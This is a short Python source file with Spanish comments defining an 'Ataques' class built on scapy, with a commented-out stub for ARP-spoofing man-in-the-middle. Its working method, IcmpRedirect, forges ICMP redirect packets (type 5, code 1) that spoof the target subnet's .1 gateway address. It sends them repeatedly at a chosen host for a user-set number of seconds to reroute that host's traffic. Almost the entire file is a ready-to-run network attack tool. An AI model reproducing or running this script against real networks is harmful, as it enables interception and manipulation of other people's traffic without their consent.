import scapy.all as scapy

class Ataques:
    


    # # Ataque arp spoofing con scapy tipo man in the middle
    # def ArpSpoofing(self, ip):
        
    # Ataque IcmpRedirect con scapy
    def IcmpRedirect(self, ip):
        
        print("Se utiliza por defecto la interfaz eth0")
        cambio_eth = input("¿Desea cambiar la interfaz? (s/n): ")
        if cambio_eth == "s":
            eth = input("Introduzca la interfaz: ")
            # Comprobamos que la interfaz existe
            if scapy.get_if_hwaddr(eth) == None:
                print("La interfaz no existe")
                return  # Salimos de la funcion
        else:
            eth = "eth0"

        # Cogemos la ip del anfitrion con scapy
        ip_anfitrion = scapy.get_if_addr(eth)

        # Utilizamos la x.x.x.1 como ip src para esto cogemos la ip pasada por parametro y le quitamos el ultimo octeto
        ip_src = ip.split(".")
        ip_src = ip_src[0] + "." + ip_src[1] + "." + ip_src[2] + ".1"

        # Creamos un paquete ICMP con la ip src y dst
        ip = scapy.IP(src=ip_src, dst=ip)
        # Creamos un paquete ICMP con el tipo 5 y el codigo 1
        icmp = scapy.ICMP(type=5, code=1)
        # Creamos un paquete ICMP con la ip del anfitrion
        ip2 = scapy.IP(src=ip_anfitrion, dst="8.8.8.8")
        # Creamos un paquete ICMP con el tipo 8 y el codigo 0
        icmp2 = scapy.ICMP(type=8, code=0)
        
        # Preguntamos al usuario si quiere enviar el paquete
        print("Va a comenzar el ataque:")
        enviar = input("¿Desea realizarlo? (s/n): ")
        if enviar == "s":
            # Preguntamos cuanto tiempo quiere que dure el ataque
            tiempo = input("Introduzca el tiempo en segundos: ")
            # Enviamos el paquete
            scapy.send(ip/icmp/ip2/icmp2, loop=1, inter=1, count=int(tiempo), verbose=False)
        else:
            print("Ataque cancelado")
            return  # Salimos de la funcion

    
        

        
